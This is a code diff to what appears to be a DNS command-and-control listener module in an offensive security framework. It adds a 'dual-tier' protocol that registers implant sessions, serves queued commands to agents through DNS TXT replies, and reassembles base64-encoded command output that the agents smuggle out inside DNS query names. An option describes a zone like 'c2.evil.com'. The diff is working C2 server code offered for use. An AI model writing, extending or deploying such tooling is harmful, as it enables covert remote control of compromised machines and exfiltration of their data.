@@ -13,6 +13,14 @@ import time
 import base64
 import socket
 
+from lib.c2.dns_cnc import (
+    TIER_CONTROL,
+    TIER_DATA,
+    parse_dual_tier_qname,
+    unwrap_control_command,
+    wrap_control_command,
+)
+
 class Module(Listener):
     """DNS C2 Listener - receives DNS queries on a subdomain, creates sessions, responds with commands via TXT."""
 
@@ -32,6 +40,7 @@ class Module(Listener):
     lhost = OptString("0.0.0.0", "Listen address for DNS server", True)
     lport = OptPort(53, "Listen port (53 requires root/admin)", True)
     domain = OptString("c2.local", "Subdomain zone for C2 (e.g. c2.evil.com - agent uses *.domain)", True)
+    dual_tier = OptBool(True, "Use ks.v1 control/data dual-tier DNS protocol", False)
 
     def __init__(self, framework=None):
         super().__init__(framework)
@@ -75,7 +84,10 @@ class Module(Listener):
         time.sleep(0.3)
 
         print_success(f"DNS C2 listener started on {host}:{port} (zone: {self._domain_lower})")
-        print_info("Agent must query: poll.<client_id>." + self._domain_lower.rstrip(".") + " and result.<b64>.<client_id>." + self._domain_lower.rstrip("."))
+        if bool(getattr(self, "dual_tier", True)):
+            print_info("Dual-tier mode: ks.v1.control.poll.<client_id> and ks.v1.data.result.<chunk>.<client_id>")
+        else:
+            print_info("Agent must query: poll.<client_id>." + self._domain_lower.rstrip(".") + " and result.<b64>.<client_id>." + self._domain_lower.rstrip("."))
         if background:
             return True
         try:
@@ -126,6 +138,45 @@ class Module(Listener):
                 if len(labels) < 2:
                     continue
                 qtype = request.q.qtype
+                domain_base = self._domain_lower.rstrip(".")
+                if bool(getattr(self, "dual_tier", True)):
+                    parsed = parse_dual_tier_qname(qname, domain_base)
+                    if parsed:
+                        client_id = parsed.get("client_id") or ""
+                        if not client_id:
+                            continue
+                        session_id = self._client_id_to_session.get(client_id)
+                        if session_id is None:
+                            session_id = self._create_dns_session(client_id, addr[0])
+                            if session_id:
+                                self._client_id_to_session[client_id] = session_id
+                                self._session_to_client_id[session_id] = client_id
+                        tier = parsed.get("tier") or TIER_CONTROL
+                        action = (parsed.get("action") or "").lower()
+                        if tier == TIER_CONTROL and action in ("poll", "register"):
+                            cmd = self._get_next_command(session_id) if session_id else ""
+                            reply_data = wrap_control_command(cmd) if cmd else "wait"
+                            if len(reply_data) > 255:
+                                reply_data = reply_data[:255]
+                        elif tier == TIER_DATA and action == "result":
+                            b64chunk = parsed.get("payload") or ""
+                            if session_id and b64chunk:
+                                try:
+                                    s = b64chunk.replace("-", "+").replace("_", "/")
+                                    pad = 4 - len(s) % 4
+                                    if pad and pad != 4:
+                                        s += "=" * pad
+                                    chunk = base64.b64decode(s).decode("utf-8", errors="replace")
+                                    self._append_output(session_id, chunk)
+                                except Exception:
+                                    self._append_output(session_id, b64chunk)
+                            reply_data = "ok"
+                        else:
+                            reply_data = "wait"
+                        reply = request.reply()
+                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(reply_data), ttl=60))
+                        self.sock.sendto(reply.pack(), addr)
+                        continue
                 # Format: type.client_id.domain or type.b64chunk.client_id.domain
                 msg_type = labels[0].lower()
                 if msg_type in ("poll", "register"):
